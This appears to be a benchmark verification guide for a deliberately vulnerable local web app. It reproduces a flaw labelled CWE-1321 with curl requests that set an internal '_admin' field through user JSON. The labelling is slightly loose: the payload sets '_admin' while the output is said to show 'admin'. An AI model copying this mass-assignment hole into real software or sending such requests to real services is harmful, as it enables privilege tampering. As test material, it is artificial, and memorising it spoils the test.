
# Verification Guide

## CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')
**Location**: DataObject.update_attributes() in src/app.py, approx. line 22

### Verification Steps

1. Install dependencies:

    ```
    python3 -m venv venv
    source venv/bin/activate
    pip install -r requirements.txt
    ```

2. Run the application:

    ```
    cd src
    python app.py
    ```

3. In a separate terminal, create a new object:

    ```
    curl -X POST -H "Content-Type: application/json" -d '{"name":"sample1", "value":"42"}' http://127.0.0.1:5000/create
    ```

    - Response should confirm creation.

4. Update the object with an "internal" attribute (`_admin`) which should not be externally settable:

    ```
    curl -X POST -H "Content-Type: application/json" -d '{"_admin": true}' http://127.0.0.1:5000/update/sample1
    ```

    - Response will show `"admin": true` indicating that the internal attribute was set via user input.

5. Confirm the effect by fetching the object:

    ```
    curl http://127.0.0.1:5000/show/sample1
    ```

    - The output includes `"admin": true`, demonstrating that a normally private or protected field was changed by an external user.

**Conclusion:**  
The `update_attributes()` method directly writes arbitrary attributes based on user-supplied JSON, allowing the manipulation of internal/protected fields—demonstrating CWE-1321.
